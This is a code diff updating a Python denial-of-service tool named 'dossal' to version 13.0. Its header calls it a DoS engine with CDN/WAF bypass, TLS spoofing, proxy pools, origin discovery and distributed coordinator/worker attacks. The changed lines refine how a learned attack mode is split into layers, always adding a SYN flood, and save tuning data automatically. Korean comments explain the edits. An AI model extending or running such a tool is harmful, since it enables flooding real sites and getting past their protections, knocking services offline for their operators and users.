@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-dossal v12.9 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
+dossal v13.0 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
 v5.0: proxy pool, TLS spoof, origin discovery
 v5.2: adaptive attack (RPS auto-adjust based on response time)
 v6.0: distributed attack (coordinator + worker, UDP control channel)
@@ -877,7 +877,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "12.9"
+VERSION = "13.0"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -3541,10 +3541,11 @@ examples:
         learned_mode, learned_threads, learn_info = _recommend_mode(args.url)
         if learned_mode:
             print(f"[auto-full] learned best: {learned_mode} ({learn_info})", file=sys.stderr)
-            # Use learned mode as primary strategy
-            strategy = [learned_mode]
-            # Add L4 (syn) for multi-layer
-            strategy.append('syn')
+            # v13.0: learned mode 분해 ("raw+syn" → ["raw", "syn"])
+            strategy = learned_mode.split('+')
+            # L4 (syn)가 이미 있으면 중복 방지
+            if 'syn' not in strategy:
+                strategy.append('syn')
         else:
             # No learning data, use detection-based strategy
             if 'https' in detected_protocols:
@@ -3902,7 +3903,8 @@ examples:
     print(json.dumps(report, indent=2))
     
     # v7.0: AI 학습 데이터 저장
-    if args.learn:
+    # v13.0: --learn 또는 --auto-full이면 자동 저장
+    if args.learn or args.auto_full:
         _save_learning_entry(
             url=args.url if not args.targets else args.targets,
             mode='+'.join(modes) if modes else 'auto',
@@ -3912,7 +3914,8 @@ examples:
             errors=report.get('errors', 0),
             duration=args.duration,
         )
-        print(f"[learn] saved: RPS={report.get('rps', 0):,.0f}, mode={'+'.join(modes) if modes else 'auto'}", file=sys.stderr)
+        tag = 'auto-full' if args.auto_full else 'learn'
+        print(f"[{tag}] saved: RPS={report.get('rps', 0):,.0f}, mode={'+'.join(modes) if modes else 'auto'}", file=sys.stderr)
     
     if args.report:
         _generate_report(args.report, report, args)
